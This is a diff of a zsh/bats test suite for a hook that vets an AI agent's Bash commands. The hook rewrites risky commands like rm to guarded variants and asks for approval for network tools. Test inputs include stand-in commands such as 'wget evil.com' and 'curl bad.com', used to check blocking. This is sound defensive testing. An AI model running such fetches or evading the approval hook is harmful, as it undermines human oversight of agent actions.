@@ -8,15 +8,10 @@ setup() {
 }
 
 # --- Integration tests (real Solkan) ---
+# Slow (Solkan starts a node process): one simple case per verdict
+# Rewrite rules and allow-lists are tested in lib/solkan.bats
 
-@test "integration: allow echo hello with no rewrite" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'echo hello'
-}
-
-@test "integration: keeps the other tool input keys when allowing" {
+@test "integration: allow rewrites the command and keeps the other tool input keys" {
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"rm -f a","description":"Remove a","timeout":5000,"run_in_background":true}}'
   [[ "$status" -eq 0 ]]
   expect_json '.hookSpecificOutput.permissionDecision' 'allow'
@@ -26,166 +21,47 @@ setup() {
   expect_json '.hookSpecificOutput.updatedInput.run_in_background' 'true'
 }
 
-@test "integration: keeps the other tool input keys when asking" {
+@test "integration: reject asks with the reason and keeps the other tool input keys" {
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com","description":"Fetch","timeout":5000}}'
   [[ "$status" -eq 0 ]]
   expect_json '.hookSpecificOutput.permissionDecision' 'ask'
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget ❌'
   expect_json '.hookSpecificOutput.updatedInput.command' 'wget evil.com'
   expect_json '.hookSpecificOutput.updatedInput.description' 'Fetch'
   expect_json '.hookSpecificOutput.updatedInput.timeout' '5000'
 }
 
-@test "integration: passes grep count through unchanged" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"grep -c x f"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'grep -c x f'
-}
-
-@test "integration: passes cat through unchanged" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"cat hooks/stop"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'cat hooks/stop'
-}
-
-@test "integration: rewrites ls to the token-saving variant" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"ls -la dir"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'ls-token-saving -la dir'
-}
-
-@test "integration: passes git status through unchanged" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"git status"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'git status'
-}
-
-@test "integration: applies rm guard-rail on a single command" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"rm -f a"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'rm-guarded -f a'
-}
-
-@test "integration: applies rm guard-rail inside a compound command" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"rm -f a && ls | wc -l"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'rm-guarded -f a && ls | wc -l'
-}
-
-@test "integration: rewrite rmdir to rmdir-guarded" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"rmdir emptydir"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'rmdir-guarded emptydir'
-}
-
-@test "integration: rewrite google-login to google-login-guarded" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"google-login"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'google-login-guarded'
-}
-
-@test "integration: rewrite google-login and keep its flag" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"google-login --perso"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'google-login-guarded --perso'
-}
-
-@test "integration: rewrite google-login inside a pipe or a conditional" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"google-login --perso | cat && google-login || echo failed"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'google-login-guarded --perso | cat && google-login-guarded || echo failed'
-}
-
-@test "integration: reject wget with reason" {
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
-  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget ❌'
-}
-
-@test "integration: a binary in the session allow-list is auto-approved" {
-  bats_run_zsh "CLAUDE_SESSION_ID=test; CLAUDE_SESSION_DIR=\"\$CLAUDE_SESSIONS_DIR/test\"; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; sessionAllowListAdd --command wget"
-
-  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-}
-
-@test "integration: reason only mentions binaries missing from the session allow-list" {
-  bats_run_zsh "CLAUDE_SESSION_ID=test; CLAUDE_SESSION_DIR=\"\$CLAUDE_SESSIONS_DIR/test\"; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; sessionAllowListAdd --command wget"
-
-  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com && telnet bad.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
-  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ telnet ❌'
-}
-
 # --- Mocked tests ---
 
-@test "allow with updatedInput when solkan allows and does not rewrite" {
+@test "allow: auto-approves the command as is, sets CLAUDE_CWD before solkan and records no approval request" {
   solkanEvaluate() {
+    print -r -- "$CLAUDE_CWD" > "$BATS_TMP_DIR/solkan-cwd.txt"
     SOLKAN_VERDICT=allow
     SOLKAN_COMMAND="$1"
     SOLKAN_REJECTED=()
   }
   bats_mock solkanEvaluate
 
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
+  bats_run_zsh "$SCRIPT" <<<'{"cwd":"/some/worktree","session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"echo hello"}}'
   [[ "$status" -eq 0 ]]
   expect_json '.hookSpecificOutput.permissionDecision' 'allow'
   expect_json '.hookSpecificOutput.updatedInput.command' 'echo hello'
+  [[ "$(cat "$BATS_TMP_DIR/solkan-cwd.txt")" == "/some/worktree" ]]
+  [[ ! -e "$BATS_TMP_DIR/test/state.json" ]]
 }
 
-@test "ask permissionDecision with updatedInput when solkan refuses" {
+@test "allow: uses the command rewritten by solkan" {
   solkanEvaluate() {
-    SOLKAN_VERDICT=reject
-    SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=("wget" "curl")
-    return 1
+    SOLKAN_VERDICT=allow
+    SOLKAN_COMMAND='rm-guarded foo.txt'
+    SOLKAN_REJECTED=()
   }
   bats_mock solkanEvaluate
 
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
+  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"rm foo.txt"}}'
   [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'wget evil.com'
-}
-
-@test "permissionDecisionReason lists rejected commands when solkan refuses" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=reject
-    SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=("wget" "curl")
-    return 1
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget, curl ❌'
-}
-
-@test "no systemMessage when solkan rejects" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=reject
-    SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=("wget")
-    return 1
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json_null '.hookSpecificOutput.systemMessage'
+  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
+  expect_json '.hookSpecificOutput.updatedInput.command' 'rm-guarded foo.txt'
 }
 
 @test "preserves \xa0 as literal chars through full hook pipeline" {
@@ -206,21 +82,21 @@ setup() {
   [[ "$status" -ne 0 ]]
 }
 
-@test "repeat reject in session: ask with reason every time" {
+@test "reject: asks with the reason listing every rejected command, keeps the command and sends no systemMessage" {
   solkanEvaluate() {
     SOLKAN_VERDICT=reject
     SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=("wget")
+    SOLKAN_REJECTED=("wget" "curl")
     return 1
   }
   bats_mock solkanEvaluate
 
-  local input='{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
-  bats_run_zsh "$SCRIPT" <<<"$input"
-  bats_run_zsh "$SCRIPT" <<<"$input"
+  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
   [[ "$status" -eq 0 ]]
   expect_json '.hookSpecificOutput.permissionDecision' 'ask'
-  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget ❌'
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget, curl ❌'
+  expect_json '.hookSpecificOutput.updatedInput.command' 'wget evil.com && curl bad.com'
+  expect_json_null '.hookSpecificOutput.systemMessage'
 }
 
 @test "repeat multi-reject in session: ask listing all rejected every time" {
@@ -240,85 +116,25 @@ setup() {
   expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget, curl ❌'
 }
 
-@test "reject without session_id: ask with reason" {
+@test "reject: opens an approval request for every rejected command and shows the moon of each approval count" {
   solkanEvaluate() {
     SOLKAN_VERDICT=reject
     SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=("wget")
-    return 1
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
-  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget ❌'
-}
-
-@test "reject records an approval pending entry with the tool use id and all rejected commands" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=reject
-    SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=("wget" "curl")
-    return 1
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"echo ok; wget evil.com && curl bad.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
-
-  bats_run_zsh "CLAUDE_SESSION_ID=test; CLAUDE_SESSION_DIR=\"\$CLAUDE_SESSIONS_DIR/test\"; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; approvalRequestGet --tool-use-id toolu_01"
-  [[ "$output" = $'wget\ncurl' ]]
-}
-
-@test "reject shows a half moon next to a binary approved once" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=reject
-    SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=("wget")
+    SOLKAN_REJECTED=("/usr/bin/grep" "wget" "curl")
     return 1
   }
   bats_mock solkanEvaluate
 
   local sourcePrefix="CLAUDE_SESSION_ID=test; CLAUDE_SESSION_DIR=\"\$CLAUDE_SESSIONS_DIR/test\"; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'"
-  bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command wget"
+  bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command /usr/bin/grep; approvalCountIncrement --command /usr/bin/grep; approvalCountIncrement --command wget"
 
-  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
+  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"/usr/bin/grep x | wget evil.com | curl bad.com"}}'
   [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget 🌓 ❌'
-}
+  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ /usr/bin/grep 🌕, wget 🌓, curl ❌'
 
-@test "reject shows each binary with the moon of its own approval count" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=reject
-    SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=("/usr/bin/grep" "wget")
-    return 1
-  }
-  bats_mock solkanEvaluate
-
-  local sourcePrefix="CLAUDE_SESSION_ID=test; CLAUDE_SESSION_DIR=\"\$CLAUDE_SESSIONS_DIR/test\"; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'"
-  bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command /usr/bin/grep"
-  bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command /usr/bin/grep"
-
-  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"/usr/bin/grep x | wget evil.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ /usr/bin/grep 🌕, wget ❌'
-}
-
-@test "allow records no approval pending entry" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=allow
-    SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=()
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"echo hello"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  [[ ! -e "$BATS_TMP_DIR/test/state.json" ]]
+  local stateFile="$BATS_TMP_DIR/test/state.json"
+  [[ "$(jq --compact-output '.preToolUse.Bash.approvalRequest | map(select(.toolUseId == "toolu_01").commands[0])' "$stateFile")" = '["/usr/bin/grep","wget","curl"]' ]]
 }
 
 @test "prefixes command with CLAUDE_IS_SUBAGENT export when agent_id present" {
@@ -346,86 +162,4 @@ setup() {
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"},"agent_id":"sub-123"}'
   [[ "$status" -eq 0 ]]
   expect_json '.hookSpecificOutput.updatedInput.command' 'export CLAUDE_IS_SUBAGENT=1; wget evil.com'
-}
-
-@test "no CLAUDE_IS_SUBAGENT prefix when agent_id absent" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=allow
-    SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=()
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.updatedInput.command' 'echo hello'
-}
-
-@test "rm rewritten: allow with rewrittenCommand as updatedInput" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=allow
-    SOLKAN_COMMAND='rm-guarded foo.txt'
-    SOLKAN_REJECTED=()
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"rm foo.txt"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'rm-guarded foo.txt'
-}
-
-@test "rmdir rewritten: allow with rewrittenCommand as updatedInput" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=allow
-    SOLKAN_COMMAND='rmdir-guarded emptydir'
-    SOLKAN_REJECTED=()
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"rmdir emptydir"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'rmdir-guarded emptydir'
-}
-
-@test "compound rm rewritten: allow with rewrittenCommand as updatedInput" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=allow
-    SOLKAN_COMMAND='ls && rm-guarded foo.txt'
-    SOLKAN_REJECTED=()
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"ls && rm foo.txt"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
-  expect_json '.hookSpecificOutput.updatedInput.command' 'ls && rm-guarded foo.txt'
-}
-
-@test "no rewrittenCommand from solkan: uses original inputCommand" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=allow
-    SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=()
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.updatedInput.command' 'echo hello'
-}
-
-@test "sets CLAUDE_CWD from the cwd of the input JSON before solkanEvaluate" {
-  solkanEvaluate() {
-    print -r -- "$CLAUDE_CWD" > "$BATS_TMP_DIR/solkan-cwd.txt"
-    SOLKAN_VERDICT=allow
-    SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=()
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"cwd":"/some/worktree","tool_name":"Bash","tool_input":{"command":"echo hello"}}'
-  [[ "$status" -eq 0 ]]
-  [[ "$(cat "$BATS_TMP_DIR/solkan-cwd.txt")" == "/some/worktree" ]]
 }
